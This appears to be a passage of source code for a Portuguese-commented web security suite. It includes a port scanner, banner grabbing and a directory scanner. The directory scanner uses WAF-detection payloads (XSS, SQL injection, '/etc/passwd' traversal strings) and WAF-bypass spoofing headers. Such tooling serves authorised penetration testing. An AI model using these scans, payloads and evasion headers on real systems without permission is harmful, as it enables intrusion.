# -*- coding: utf-8 -*-
import socket
import sys
import argparse
from datetime import datetime, timedelta
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
import threading
import re
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, urlencode
import ssl
import warnings
from collections import Counter
from difflib import SequenceMatcher
import time
import json
import os
import itertools
import logging

# Tenta importar bibliotecas de terceiros e avisa se não estiverem instaladas
try:
    import requests
    from PIL import Image
    from PIL.ExifTags import TAGS
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from rich.syntax import Syntax
    from rich.panel import Panel
    from rich.text import Text
    import dns.resolver
    from bs4 import BeautifulSoup
    import whois
    from OpenSSL import crypto
except ImportError:
    print("[!] Erro: Bibliotecas necessárias não encontradas.")
    print("[!] Por favor, instale-as com: pip install -r requirements.txt")
    sys.exit(1)

# Importação opcional do Selenium para DOM XSS
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.firefox.service import Service as FirefoxService
    from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# --- AVISO LEGAL ---
# Este script foi criado para fins estritamente educacionais.
# O autor não se responsabiliza pelo mau uso desta ferramenta.
# Use-o apenas em sistemas e redes para os quais você tenha
# permissão explícita para testar. O acesso não autorizado
# a sistemas de computador é ilegal e não recomendado.

# --- CONFIGURAÇÃO INICIAL ---
console = Console()
# Suprime avisos para uma saída mais limpa
warnings.filterwarnings("ignore", category=DeprecationWarning)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
CACHE_DIR = ".spectra_cache"
CVE_CACHE_FILE = os.path.join(CACHE_DIR, "cve_cache.json")
CACHE_DURATION_HOURS = 24


# --- BANNER ---
def display_banner():
    """Exibe o banner da ferramenta e as informações iniciais."""
    banner = """
    
 ░▒▓███████▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓████████▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 

"""
    version = "3.2.6" # Versão com refatoração completa do módulo Brute Force
    console.print(f"[bold cyan]{banner}[/bold cyan]")
    console.print(f"[bold]Spectra - Web Security Suite v{version}[/bold]")
    console.print("[italic]Uma ferramenta de hacking ético para análise de segurança web.[/italic]")
    console.print("-" * 60)

# --- MÓDULO 1: SCANNER DE PORTAS AVANÇADO ---

import struct
import platform

class AdvancedPortScanner:
    def __init__(self, target, scan_type='tcp', timeout=1.0, delay=0, max_workers=50):
        self.target = target
        self.target_ip = None
        self.scan_type = scan_type.lower()
        self.timeout = timeout
        self.delay = delay
        self.max_workers = max_workers
        self.results = {}
        
        # Service signatures para detecção
        self.service_signatures = {
            21: {'name': 'FTP', 'probes': [b'', b'HELP\r\n'], 'signatures': [b'220', b'FTP']},
            22: {'name': 'SSH', 'probes': [b''], 'signatures': [b'SSH-']},
            23: {'name': 'Telnet', 'probes': [b''], 'signatures': [b'\xff\xfb', b'\xff\xfc']},
            25: {'name': 'SMTP', 'probes': [b'', b'EHLO test\r\n'], 'signatures': [b'220', b'SMTP']},
            53: {'name': 'DNS', 'probes': [], 'signatures': []},
            80: {'name': 'HTTP', 'probes': [b'GET / HTTP/1.0\r\n\r\n'], 'signatures': [b'HTTP/', b'Server:']},
            110: {'name': 'POP3', 'probes': [b''], 'signatures': [b'+OK']},
            111: {'name': 'RPC', 'probes': [], 'signatures': []},
            135: {'name': 'RPC', 'probes': [], 'signatures': []},
            139: {'name': 'NetBIOS', 'probes': [], 'signatures': []},
            143: {'name': 'IMAP', 'probes': [b''], 'signatures': [b'* OK']},
            443: {'name': 'HTTPS', 'probes': [], 'signatures': []},
            445: {'name': 'SMB', 'probes': [], 'signatures': []},
            993: {'name': 'IMAPS', 'probes': [], 'signatures': []},
            995: {'name': 'POP3S', 'probes': [], 'signatures': []},
            3306: {'name': 'MySQL', 'probes': [b''], 'signatures': [b'\x00\x00\x00\x0a']},
            3389: {'name': 'RDP', 'probes': [], 'signatures': []},
            5432: {'name': 'PostgreSQL', 'probes': [], 'signatures': []},
            5900: {'name': 'VNC', 'probes': [b''], 'signatures': [b'RFB']},
            6379: {'name': 'Redis', 'probes': [b'*1\r\n$4\r\nPING\r\n'], 'signatures': [b'+PONG']},
        }
        
        # Common UDP services
        self.udp_services = {
            53: 'DNS',
            67: 'DHCP',
            68: 'DHCP',
            69: 'TFTP',
            123: 'NTP',
            161: 'SNMP',
            162: 'SNMP-Trap',
            514: 'Syslog',
            1900: 'UPnP'
        }
    
    def resolve_target(self):
        """Resolve hostname para IP."""
        try:
            self.target_ip = socket.gethostbyname(self.target)
            return True
        except socket.gaierror as e:
            console.print(f"[red]Erro ao resolver '{self.target}': {e}[/red]")
            return False
    
    def tcp_connect_scan(self, port):
        """TCP Connect scan - mais compatível mas detectável."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                result = s.connect_ex((self.target_ip, port))
                if result == 0:
                    return {'status': 'open', 'method': 'tcp_connect'}
                else:
                    return {'status': 'closed', 'method': 'tcp_connect'}
        except Exception as e:
            return {'status': 'error', 'method': 'tcp_connect', 'error': str(e)}
    
    def tcp_syn_scan(self, port):
        """TCP SYN scan - requer privilégios de root."""
        try:
            # Nota: Implementação simplificada - em produção usaria raw sockets
            # Por enquanto, fallback para connect scan
            return self.tcp_connect_scan(port)
        except Exception as e:
            return {'status': 'error', 'method': 'tcp_syn', 'error': str(e)}
    
    def udp_scan(self, port):
        """UDP scan - envia payload específico por serviço."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(max(self.timeout, 2.0))  # Mínimo 2s para UDP
                
                # Payloads específicos expandidos
                payload = b''
                if port == 53:  # DNS query
                    payload = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
                elif port == 123:  # NTP query
                    payload = b'\x1b' + b'\x00' * 47
                elif port == 161:  # SNMP query
                    payload = b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
                elif port == 67 or port == 68:  # DHCP Discover
                    payload = b'\x01\x01\x06\x00\x00\x00\x3d\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                elif port == 69:  # TFTP
                    payload = b'\x00\x01test\x00netascii\x00'
                elif port == 514:  # Syslog
                    payload = b'<14>test syslog message'
                elif port == 1900:  # UPnP SSDP
                    payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nST: upnp:rootdevice\r\nMX: 3\r\n\r\n'
                elif port == 5353:  # mDNS
                    payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01'
                
                # Tenta múltiplas vezes para UDP (pode haver perda de pacotes)
                for attempt in range(2):
                    s.sendto(payload, (self.target_ip, port))
                    
                    try:
                        data, addr = s.recvfrom(1024)
                        # Analisa a resposta para determinar o serviço
                        service_info = self._analyze_udp_response(port, data)
                        return {
                            'status': 'open', 
                            'method': 'udp', 
                            'response': data[:100],
                            'service_info': service_info,
                            'raw_response_len': len(data)
                        }
                    except socket.timeout:
                        if attempt == 0:
                            continue  # Tenta novamente
                        # Se nenhuma resposta após 2 tentativas
                        if payload:  # Se enviamos um payload específico
                            return {'status': 'open|filtered', 'method': 'udp', 'payload_sent': True}
                        else:
                            return {'status': 'open|filtered', 'method': 'udp', 'payload_sent': False}
                    
        except Exception as e:
            return {'status': 'error', 'method': 'udp', 'error': str(e)}
    
    def _analyze_udp_response(self, port, data):
        """Analisa resposta UDP para identificar serviço."""
        info = {}
        
        if port == 53 and len(data) >= 12:  # DNS
            info['service'] = 'DNS'
            # Analisa header DNS
            if data[2] & 0x80:  # QR bit set (resposta)
                info['dns_response'] = True
                
        elif port == 123 and len(data) >= 48:  # NTP
            info['service'] = 'NTP'
            if data[0] & 0x07:  # Mode field
                info['ntp_mode'] = data[0] & 0x07
                
        elif port == 161:  # SNMP
            info['service'] = 'SNMP'
            if data.startswith(b'\x30'):  # ASN.1 BER encoding
                info['snmp_response'] = True
                
        elif port == 1900:  # UPnP
            if b'HTTP/' in data:
                info['service'] = 'UPnP'
                info['upnp_response'] = True
                
        elif port in [67, 68]:  # DHCP
            if len(data) >= 240 and data[0] == 0x02:  # DHCP Reply
                info['service'] = 'DHCP'
                info['dhcp_response'] = True
        
        return info
    
    def enhanced_banner_grab(self, port, scan_result):
        """Banner grabbing avançado com protocolos específicos."""
        if scan_result.get('status') != 'open':
            return scan_result
        
        banner = ""
        service_info = {}
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((self.target_ip, port))
                
                # Verifica se temos assinaturas específicas para esta porta
                if port in self.service_signatures:
                    sig_info = self.service_signatures[port]
                    
                    # Tenta cada probe
                    for probe in sig_info['probes']:
                        try:
                            if probe:
                                s.send(probe)
                            data = s.recv(1024)
                            banner += data.decode('utf-8', errors='ignore')
                            
                            # Verifica assinaturas conhecidas
                            for signature in sig_info['signatures']:
                                if signature in data:
                                    service_info['detected_service'] = sig_info['name']
                                    break
                            break
                        except:
                            continue
                else:
                    # Banner grab genérico
                    try:
                        data = s.recv(1024)
                        banner = data.decode('utf-8', errors='ignore')
                    except:
                        pass
                
                # Detecção de serviço por análise de banner
                if banner:
                    service_info.update(self._analyze_banner(banner, port))
                
        except Exception as e:
            service_info['banner_error'] = str(e)
        
        scan_result.update({
            'banner': banner.strip(),
            'service_info': service_info,
            'service': service_info.get('detected_service', self._get_default_service(port))
        })
        
        return scan_result
    
    def _analyze_banner(self, banner, port):
        """Analisa banner para detectar serviço e versão."""
        banner_lower = banner.lower()
        info = {}
        
        # HTTP server detection
        if 'server:' in banner_lower:
            server_line = [line for line in banner.split('\n') if 'server:' in line.lower()]
            if server_line:
                info['server'] = server_line[0].split(':', 1)[1].strip()
        
        # SSH version
        if banner.startswith('SSH-'):
            info['ssh_version'] = banner.split()[0]
            if 'openssh' in banner_lower:
                info['software'] = 'OpenSSH'
        
        # FTP server
        if '220' in banner and 'ftp' in banner_lower:
            info['detected_service'] = 'FTP'
            if 'vsftpd' in banner_lower:
                info['software'] = 'vsftpd'
            elif 'filezilla' in banner_lower:
                info['software'] = 'FileZilla'
        
        # SMTP server
        if '220' in banner and 'smtp' in banner_lower:
            info['detected_service'] = 'SMTP'
            if 'postfix' in banner_lower:
                info['software'] = 'Postfix'
            elif 'sendmail' in banner_lower:
                info['software'] = 'Sendmail'
        
        # Web applications
        if 'apache' in banner_lower:
            info['software'] = 'Apache'
        elif 'nginx' in banner_lower:
            info['software'] = 'Nginx'
        elif 'iis' in banner_lower:
            info['software'] = 'IIS'
        
        return info
    
    def _get_default_service(self, port):
        """Retorna serviço padrão baseado na porta."""
        try:
            return socket.getservbyport(port, 'tcp')
        except:
            return self.service_signatures.get(port, {}).get('name', 'Unknown')
    
    def scan_single_port(self, port):
        """Scan de uma única porta."""
        if self.delay > 0:
            time.sleep(self.delay / 1000.0)  # delay em ms
        
        result = {'port': port, 'timestamp': datetime.now()}
        
        # Escolhe método de scan baseado no tipo
        if self.scan_type == 'tcp' or self.scan_type == 'tcp_connect':
            scan_result = self.tcp_connect_scan(port)
        elif self.scan_type == 'syn':
            scan_result = self.tcp_syn_scan(port)
        elif self.scan_type == 'udp':
            scan_result = self.udp_scan(port)
        else:
            scan_result = self.tcp_connect_scan(port)  # fallback
        
        result.update(scan_result)
        
        # Banner grabbing se a porta estiver aberta
        if scan_result.get('status') == 'open':
            result = self.enhanced_banner_grab(port, result)
        
        return result
    
    def scan_ports(self, ports, show_progress=True):
        """Scan principal com múltiplas portas."""
        if not self.resolve_target():
            return {}
        
        console.print("-" * 60)
        console.print(f"[*] Scanner Avançado de Portas - Spectra v3.2.6")
        console.print(f"[*] Alvo: [bold cyan]{self.target}[/bold cyan] ({self.target_ip})")
        console.print(f"[*] Tipo de scan: [bold cyan]{self.scan_type.upper()}[/bold cyan]")
        console.print(f"[*] Portas: [bold cyan]{len(ports)}[/bold cyan]")
        console.print(f"[*] Timeout: [bold cyan]{self.timeout}s[/bold cyan]")
        console.print(f"[*] Workers: [bold cyan]{self.max_workers}[/bold cyan]")
        if self.delay > 0:
            console.print(f"[*] Delay: [bold cyan]{self.delay}ms[/bold cyan]")
        console.print(f"[*] Início: [bold cyan]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/bold cyan]")
        console.print("-" * 60)
        
        results = {}
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_port = {executor.submit(self.scan_single_port, port): port for port in ports}
            
            if show_progress:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TimeRemainingColumn(),
                    console=console
                ) as progress:
                    task = progress.add_task(f"[green]Scan {self.scan_type.upper()}...", total=len(ports))
                    
                    for future in as_completed(future_to_port):
                        result = future.result()
                        port = result['port']
                        results[port] = result
                        
                        # Mostra portas abertas em tempo real
                        if result.get('status') == 'open':
                            open_ports.append(result)
                            service = result.get('service_info', {}).get('service', result.get('service', 'Unknown'))
                            protocol = result.get('method', 'tcp').replace('_connect', '').replace('_', '-')
                            console.print(f"[bold green][+] {port}/{protocol} open [cyan]{service}[/cyan][/bold green]")
                        elif result.get('status') == 'open|filtered' and self.scan_type == 'udp':
                            # Para UDP, inclui portas filtered nos resultados se payload foi enviado
                            if result.get('payload_sent'):
                                open_ports.append(result)
                                console.print(f"[bold yellow][?] {port}/udp open|filtered [cyan](payload sent)[/cyan][/bold yellow]")
                        
                        progress.update(task, advance=1)
            else:
                for future in as_completed(future_to_port):
                    result = future.result()
                    port = result['port']
                    results[port] = result
                    if result.get('status') == 'open':
                        open_ports.append(result)
                    elif result.get('status') == 'open|filtered' and self.scan_type == 'udp' and result.get('payload_sent'):
                        open_ports.append(result)
        
        self.results = results
        self._display_results(open_ports)
        return results
    
    def _display_results(self, open_ports):
        """Exibe resultados de forma organizada."""
        console.print("-" * 60)
        console.print("[*] Scan concluído.")
        
        if not open_ports:
            console.print("[bold yellow][-] Nenhuma porta aberta encontrada.[/bold yellow]")
            console.print("-" * 60)
            return
        
        # Organiza por porta
        open_ports.sort(key=lambda x: x['port'])
        
        # Tabela principal
        table = Table(title=f"Portas Abertas - {self.target}")
        table.add_column("Porta", justify="center", style="cyan")
        table.add_column("Status", justify="center", style="green")
        table.add_column("Serviço", style="magenta")
        table.add_column("Software", style="yellow")
        table.add_column("Banner/Info", style="dim", max_width=40)
        
        for result in open_ports:
            port_num = result['port']
            protocol = result.get('method', 'tcp').replace('_connect', '').replace('_', '-')
            port = f"{port_num}/{protocol}"
            status = result.get('status', 'unknown')
            
            # Informações de serviço
            service_info = result.get('service_info', {})
            service = service_info.get('service', result.get('service', 'Unknown'))
            
            # Software/versão
            software = service_info.get('software', service_info.get('server', ''))
            if service_info.get('ssh_version'):
                software = service_info['ssh_version']
            
            # Banner ou informações UDP
            banner = result.get('banner', '')
            if result.get('method') == 'udp':
                # Para UDP, mostra informações específicas
                udp_info = []
                if service_info.get('dns_response'):
                    udp_info.append("DNS Response")
                if service_info.get('ntp_mode'):
                    udp_info.append(f"NTP Mode {service_info['ntp_mode']}")
                if service_info.get('snmp_response'):
                    udp_info.append("SNMP Response")
                if service_info.get('upnp_response'):
                    udp_info.append("UPnP Response")
                if service_info.get('dhcp_response'):
                    udp_info.append("DHCP Response")
                if result.get('raw_response_len'):
                    udp_info.append(f"{result['raw_response_len']} bytes")
                
                banner = ', '.join(udp_info) if udp_info else 'UDP Response'
            else:
                if len(banner) > 50:
                    banner = banner[:47] + "..."
            
            table.add_row(port, status, service, software, banner)
        
        console.print(table)
        
        # Estatísticas
        console.print(f"\n[bold green][+] {len(open_ports)} portas abertas encontradas[/bold green]")
        
        # Serviços únicos
        services = set()
        for result in open_ports:
            service_info = result.get('service_info', {})
            if service_info.get('software'):
                services.add(service_info['software'])
            elif result.get('service') and result.get('service') != 'Unknown':
                services.add(result.get('service'))
            elif service_info.get('service'):
                services.add(service_info['service'])
        
        # Filtra valores None e ordena
        valid_services = [s for s in services if s is not None]
        if valid_services:
            console.print(f"[*] Serviços detectados: [cyan]{', '.join(sorted(valid_services))}[/cyan]")
        
        console.print("-" * 60)

def scan_port(target_ip, port, grab_banner_flag):
    """Tenta conectar a uma porta, retorna serviço e opcionalmente o banner."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((target_ip, port)) == 0:
                try:
                    service = socket.getservbyport(port, 'tcp')
                except OSError:
                    service = "Desconhecido"
                
                banner = ""
                if grab_banner_flag:
                    try:
                        s.settimeout(2) # Timeout maior para receber o banner
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    except Exception:
                        banner = "(Não foi possível obter)"

                return (port, service, banner)
    except socket.error:
        pass
    return None

def parse_ports(port_spec):
    """Analisa a especificação de portas (ex: '80', '80,443', '1-1024')."""
    ports = set()
    if not port_spec:
        return []
    if '-' in port_spec:
        try:
            start, end = map(int, port_spec.split('-'))
            if 0 < start <= end < 65536:
                ports.update(range(start, end + 1))
            else:
                raise ValueError
        except ValueError:
            console.print(f"[bold red][!] Erro: Intervalo de portas inválido '{port_spec}'.[/bold red]")
            sys.exit(1)
    elif ',' in port_spec:
        try:
            ports.update(int(p.strip()) for p in port_spec.split(','))
        except ValueError:
            console.print(f"[bold red][!] Erro: Lista de portas inválida '{port_spec}'.[/bold red]")
            sys.exit(1)
    else:
        try:
            ports.add(int(port_spec))
        except ValueError:
            console.print(f"[bold red][!] Erro: Número de porta inválido '{port_spec}'.[/bold red]")
            sys.exit(1)
    return sorted(list(ports))

def scan_ports_threaded(host, port_spec, verbose, grab_banner_flag, workers=100, scan_type='tcp', timeout=1.0, delay=0):
    """Interface de compatibilidade - usa o scanner avançado."""
    ports_to_scan = parse_ports(port_spec)
    if not ports_to_scan:
        return
    
    # Usa o scanner avançado
    scanner = AdvancedPortScanner(
        target=host,
        scan_type=scan_type,
        timeout=timeout,
        delay=delay,
        max_workers=workers
    )
    
    results = scanner.scan_ports(ports_to_scan)
    return results

def advanced_port_scan(host, port_spec, scan_type='tcp', timeout=1.0, delay=0, workers=50, output_format='table'):
    """Scanner de portas avançado com múltiplas funcionalidades."""
    ports_to_scan = parse_ports(port_spec)
    if not ports_to_scan:
        return {}
    
    scanner = AdvancedPortScanner(
        target=host,
        scan_type=scan_type,
        timeout=timeout,
        delay=delay,
        max_workers=workers
    )
    
    results = scanner.scan_ports(ports_to_scan)
    
    # Output em diferentes formatos
    if output_format == 'json':
        import json
        return json.dumps(results, default=str, indent=2)
    elif output_format == 'xml':
        return _results_to_xml(results, host)
    
    return results

def _results_to_xml(results, target):
    """Converte resultados para formato XML (similar ao nmap)."""
    xml_output = f"""<?xml version="1.0" encoding="UTF-8"?>
<spectra_scan>
    <scaninfo type="syn" protocol="tcp" numservices="{len(results)}"/>
    <host>
        <address addr="{target}" addrtype="ipv4"/>
        <ports>"""
    
    for port, result in results.items():
        if result.get('status') == 'open':
            service = result.get('service', 'unknown')
            software = result.get('service_info', {}).get('software', '')
            banner = result.get('banner', '')
            
            xml_output += f"""
            <port protocol="tcp" portid="{port}">
                <state state="{result.get('status')}" reason="{result.get('method', 'tcp_connect')}"/>
                <service name="{service}" product="{software}" extrainfo="{banner[:50]}"/>
            </port>"""
    
    xml_output += """
        </ports>
    </host>
</spectra_scan>"""
    
    return xml_output

# --- MÓDULO 2: CAPTURA DE BANNER ---

def grab_banner(host, port):
    """Tenta se conectar a uma porta e capturar o banner do serviço."""
    console.print("-" * 60)
    console.print(f"[*] Capturando banner de [bold cyan]{host}:{port}[/bold cyan]")
    console.print("-" * 60)
    try:
        with console.status(f"[bold green]Conectando em {host}:{port}...[/bold green]"):
            with socket.socket() as s:
                s.settimeout(4)
                s.connect((host, port))
                banner = s.recv(2048).decode('utf-8', errors='ignore').strip()
        
        if banner:
            console.print(f"[bold green][+] Banner da porta {port}:[/bold green]")
            console.print(banner)
        else:
            console.print(f"[bold yellow][-] Porta {port}: Banner vazio ou não recebido.[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red][!] Erro ao conectar na porta {port}: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 3: SCANNER DE DIRETÓRIOS WEB AVANÇADO ---

import hashlib
import uuid
from collections import Counter

class AdvancedDirectoryScanner:
    def __init__(self, base_url, wordlist_path, workers=30, timeout=10, retries=3):
        self.base_url = base_url.rstrip('/')
        self.wordlist_path = wordlist_path
        self.workers = workers
        self.timeout = timeout
        self.retries = retries
        self.session = None
        self.baseline_404 = None
        self.waf_detected = False
        self.detected_technologies = set()
        self.results = []
        self.errors = []
        
        # Configurações avançadas
        self.smart_filtering = True
        self.extension_fuzzing = True
        self.recursive_enabled = False
        self.max_depth = 3
        self.stealth_mode = False
        
        # Estatísticas
        self.requests_made = 0
        self.false_positives_filtered = 0
        
    def _setup_session(self):
        """Configura sessão HTTP otimizada para directory discovery."""
        self.session = requests.Session()
        
        # Headers padrão para evasão
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Headers para bypass de WAF se detectado
        if self.waf_detected:
            self.session.headers.update(self._get_waf_bypass_headers())
        
        # Configurações de adapter para pool de conexões
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.workers,
            pool_maxsize=self.workers * 2,
            max_retries=0  # Controlamos retry manualmente
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
    def _get_waf_bypass_headers(self):
        """Headers para bypass de WAF."""
        return {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Proto': 'https'
        }
    
    def _detect_baseline_404(self):
        """Detecta características de páginas 404 customizadas."""
        console.print("[*] Detectando baseline 404...")
        
        # Gera URLs aleatórias que certamente não existem
        random_paths = [
            f"/{uuid.uuid4().hex}",
            f"/{uuid.uuid4().hex}.html",
            f"/{uuid.uuid4().hex}.php",
            f"/{uuid.uuid4().hex}.asp",
            f"/test{uuid.uuid4().hex[:8]}"
        ]
        
        baseline_responses = []
        
        for path in random_paths:
            url = f"{self.base_url}{path}"
            response = self._make_request(url)
            
            if response:
                baseline_responses.append({
                    'status': response.status_code,
                    'length': len(response.content),
                    'hash': hashlib.md5(response.content).hexdigest(),
                    'headers': dict(response.headers),
                    'content_preview': response.text[:500]
                })
        
        # Analisa padrões comuns nas respostas 404
        if baseline_responses:
            status_codes = [r['status'] for r in baseline_responses]
            content_lengths = [r['length'] for r in baseline_responses]
            content_hashes = [r['hash'] for r in baseline_responses]
            
            # Determina padrão mais comum
            most_common_status = Counter(status_codes).most_common(1)[0][0]
            avg_length = sum(content_lengths) // len(content_lengths)
            
            self.baseline_404 = {
                'status_codes': set(status_codes),
                'avg_length': avg_length,
                'length_variance': max(content_lengths) - min(content_lengths),
                'content_hashes': set(content_hashes),
                'common_status': most_common_status,
                'samples': baseline_responses
            }
            
            console.print(f"[*] Baseline 404 detectado: Status {most_common_status}, Length ~{avg_length}")
        else:
            console.print("[!] Falha ao detectar baseline 404 - usando detecção padrão")
            self.baseline_404 = None
    
    def _detect_waf(self):
        """Detecta presença de Web Application Firewall."""
        console.print("[*] Verificando presença de WAF...")
        
        waf_payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
            "<img src=x onerror=alert(1)>",
            "UNION SELECT * FROM users--"
        ]
        
        for payload in waf_payloads:
            test_url = f"{self.base_url}?test={payload}"
            response = self._make_request(test_url)
            
            if response and self._is_waf_response(response):
                self.waf_detected = True
                console.print("[!] WAF detectado - ativando modo evasão")
                return True
        
        console.print("[*] Nenhum WAF detectado")
        return False
    
    def _is_waf_response(self, response):
        """Verifica se a resposta indica bloqueio por WAF."""
        waf_indicators = [
            # Status codes comuns de WAF
            response.status_code in [403, 406, 429, 501, 503],
            
            # Headers de WAF
            any(header.lower() in ['cloudflare', 'akamai', 'incapsula', 'sucuri', 'barracuda'] 
                for header in response.headers.keys()),
            
            # Conteúdo de bloqueio
            any(phrase in response.text.lower() for phrase in [
                'blocked', 'forbidden', 'access denied', 'security',
                'firewall', 'protection', 'cloudflare', 'ray id'
            ])
        ]
        
        return any(waf_indicators)
    
    def _make_request(self, url, method='GET'):
        """Faz requisição com retry logic e error handling robusto."""
        for attempt in range(self.retries):
            try:
                if self.stealth_mode and attempt > 0:
                    time.sleep(0.5 * attempt)  # Delay progressivo em modo stealth
                
                if method == 'GET':
                    response = self.session.get(url, timeout=self.timeout, 
                                              allow_redirects=False, verify=False)
                elif method == 'HEAD':
                    response = self.session.head(url, timeout=self.timeout, 
                                               allow_redirects=False, verify=False)
                
                self.requests_made += 1
                return response
                
            except requests.exceptions.Timeout:
                if attempt == self.retries - 1:
                    self.errors.append(f"Timeout após {self.retries} tentativas: {url}")
                continue
                
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded" in str(e) or "429" in str(e):
                    self.errors.append(f"Rate limited: {url}")
                    time.sleep(2 ** attempt)  # Backoff exponencial
                    continue
                if attempt == self.retries - 1:
                    self.errors.append(f"Erro de conexão: {url}")
                continue
                
            except requests.exceptions.RequestException as e:
                self.errors.append(f"Erro de requisição: {url} - {e}")
                break
        
        return None
    
    def _is_false_positive(self, response, url):
        """Verifica se a resposta é um false positive baseado no baseline 404."""
        if not self.baseline_404 or not response:
            return response is None or response.status_code == 404
        
        content_length = len(response.content)
        content_hash = hashlib.md5(response.content).hexdigest()
        
        # Verifica contra padrões conhecidos de 404
        if (response.status_code in self.baseline_404['status_codes'] and
            content_hash in self.baseline_404['content_hashes']):
            self.false_positives_filtered += 1
            return True
        
        # Verifica similaridade de tamanho (páginas 404 customizadas)
        if (response.status_code == self.baseline_404['common_status'] and
            abs(content_length - self.baseline_404['avg_length']) < 50):
            
            # Análise adicional de conteúdo para páginas similares
            if self._content_similarity_check(response.text):
                self.false_positives_filtered += 1
                return True
        
        return False
    
    def _content_similarity_check(self, content):
        """Verifica similaridade de conteúdo com amostras 404."""
        if not self.baseline_404:
            return False
        
        # Palavras-chave comuns em páginas 404
        error_keywords = ['not found', '404', 'page not found', 'file not found', 
                         'does not exist', 'cannot be found', 'error']
        
        content_lower = content.lower()
        
        # Se contém muitas palavras-chave de erro, provavelmente é 404
        keyword_count = sum(1 for keyword in error_keywords if keyword in content_lower)
        
        return keyword_count >= 2
    
    def _analyze_response(self, response, url):
        """Análise abrangente da resposta HTTP."""
        if not response:
            return None
        
        # Verifica se é false positive primeiro
        if self._is_false_positive(response, url):
            return None
        
        status = response.status_code
        headers = response.headers
        
        result = {
            'url': url,
            'status': status,
            'length': len(response.content),
            'content_type': headers.get('Content-Type', ''),
            'server': headers.get('Server', ''),
            'redirect_location': '',
            'directory_type': 'unknown',
            'interesting_headers': {},
            'notes': []
        }
        
        # Análise específica por status code
        if status == 200:
            result.update(self._analyze_200_response(response, url))
        elif status == 403:
            result.update(self._analyze_403_response(response, url))
